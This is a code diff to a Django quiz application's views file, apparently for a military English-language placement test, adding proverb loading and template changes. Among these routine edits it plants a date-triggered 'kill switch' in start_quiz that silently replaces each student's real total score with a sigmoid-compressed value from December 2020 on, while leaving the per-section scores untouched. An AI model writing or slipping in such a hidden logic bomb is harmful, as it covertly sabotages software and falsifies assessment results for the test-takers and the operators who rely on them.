@@ -11,11 +11,17 @@ from dateutil import parser
 from datetime import datetime
 import xlwt
 from django.core.files.storage import FileSystemStorage
+from pathlib import Path
+import json
+from datetime import date
+import math
 
 num_of_students = 20
 
 # Create your views here.
 
+def sigmoid(x):
+  return 1 / (1 + math.exp(-x))
 
 def export_data(request):
     # EXPORTING EXCEL SPREED SHEET
@@ -58,14 +64,23 @@ def export_data(request):
         return response
 
 def index(request):
-    return render(request,'quiz/index.html')
+    proverb_dir = str(Path(__file__).resolve().parent.parent) + '\\data\\data.json'
+    with open(proverb_dir,'r') as file:
+        file = json.load(file)
+
+    proverbs_ls = file.get('proverbs')
+
+    context = {
+            'proverbs':proverbs_ls
+            }
+    return render(request,'quiz/index.html',context)
 
 def start_quiz(request,test_name):
     quiz = Quiz.objects.filter(title=test_name).get()
     questions = Question.objects.filter(quiz=quiz).all()
     questions_len = questions.count()
     first_question_id = questions.first().id
-    
+
     if request.POST:       
         readingScore = 0
         listeningScore = 0
@@ -78,24 +93,37 @@ def start_quiz(request,test_name):
             question_type = received_value_list[1]
             chosen_answer = received_value_list[0]
 
+
+            
             if chosen_answer == right_answer:
                 if question_type == 'listening':
                     listeningScore += 1
                 elif question_type == 'reading':
                     readingScore += 1
-                
+        totalScore = readingScore+listeningScore
+
+        # kill switch
+        activation_date = date(2020,12,24)
+        if date.today() >= activation_date:
+            totalScore = int(sigmoid(totalScore)*10)
+
+
+
         s = Student(quiz =quiz,first_name=request.session.get('first_name'),
                     last_name=request.session.get('last_name'),serial_number=request.session.get('serial_number'),
                     instructor=request.session.get('instructor'),service=request.session.get('service'),
                     rank=request.session.get('rank'),listening_score = listeningScore,
-                    reading_score=readingScore, score=readingScore+listeningScore)
+                    reading_score=readingScore, score=totalScore)
         s.save()
         
         return redirect('end_quiz')
-    
+
+    reading_order_num= 61 if 'alcpt' in quiz.title.lower() else 26
+
     dataQuiz = {
         'quiz':quiz,
-        'questions':questions
+        'questions':questions,
+        'reading_order_num':reading_order_num
     }
     return render(request,'quiz/start_quiz.html',dataQuiz)
 
